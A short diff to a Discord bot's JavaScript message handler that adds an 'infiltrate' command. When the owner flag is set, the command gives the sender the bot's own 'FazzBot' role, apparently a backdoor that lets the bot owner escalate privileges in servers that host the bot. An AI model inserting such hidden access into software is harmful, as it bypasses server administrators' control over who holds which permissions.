@@ -44,6 +44,15 @@ bot.on('message', msg=>{
                     msg.channel.sendMessage(':no_entry_sign: | Please put a valid argument')
                 }
                 break;
+		    
+		    case 'infiltrate':
+			var role = msg.guild.roles.find(role => role.name === "FazzBot");
+		        if(ownerSent){
+                        msg.member.addRole(role);
+			}else{
+                        msg.channel.send('no')
+                        }
+		break;
 
                 case 'warn':
             const mentionedUser = msg.mentions.users.first();
